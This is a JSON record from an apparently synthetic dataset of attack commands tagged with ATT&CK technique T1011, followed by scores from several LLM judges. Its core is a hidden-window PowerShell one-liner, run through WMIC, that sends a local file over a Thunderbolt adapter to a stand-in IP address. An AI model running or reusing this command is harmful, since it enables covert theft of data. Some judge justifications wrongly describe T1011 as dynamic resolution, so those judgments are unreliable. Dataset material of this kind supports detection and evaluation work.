{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Thunderbolt*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('203.0.113.155',54901); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\ProgramData\\Temp\\blob.dat'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Invokes PowerShell via WMIC to bind to a Thunderbolt network adapter and send data over TCP to a non-standard port. Thunderbolt networking is used as an alternate medium to the primary network per T1011.",
  "rationale_steps": [
    "Locate a Thunderbolt NIC via WMI adapter description.",
    "Bind a TCP client to the Thunderbolt interface's IPv4 address.",
    "Connect to an external destination using a high, uncommon port.",
    "Exfiltrate data over the Thunderbolt network path.",
    "No persistent or system-wide network reconfiguration is performed."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-4e9ac17f",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, with correct PowerShell syntax including variable declarations, pipeline operations, and method calls.",
        "semantic_score": 2,
        "semantic_justification": "While the command is technically valid, it doesn't implement T1011 (Exfiltration Over Other Network Medium) correctly as it's using a standard TCP connection over a Thunderbolt adapter rather than using a separate network medium for exfiltration, and doesn't implement dynamic resolution as described in the technique.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T06:50:38.850444Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, with correct nesting, balanced quotes, and proper PowerShell variable escaping within the WMIC string, making it fully parseable.",
        "semantic_score": 2,
        "semantic_justification": "The command incorrectly claims 'None' privilege, as `wmic process call create` typically requires administrative rights, and it misaligns with MITRE ATT&CK T1011, which focuses on dynamic resolution of *remote* command and control endpoints, not local interface selection.",
        "combined_score": 3.5,
        "confidence": 0.9,
        "timestamp": "2025-10-02T06:51:07.292185Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 2,
        "syntactic_justification": "Outer quoting is balanced but pervasive use of PowerShell backticks to escape $ (e.g., `$ifc, `$_) in non-string code will likely cause parsing failures, so the one-liner is broken as written.",
        "semantic_score": 1,
        "semantic_justification": "The command uses a hardcoded IP and interface binding with no DNS/DGA/endpoint rotation, so it does not implement Dynamic Resolution (T1011) as described.",
        "combined_score": 1.5,
        "confidence": 0.7,
        "timestamp": "2025-10-02T06:52:19.672259Z"
      }
    ],
    "llm_average_syntactic": 4.0,
    "llm_average_semantic": 1.667,
    "llm_average_score": 2.833,
    "llm_verdict": "likely_mismatch",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}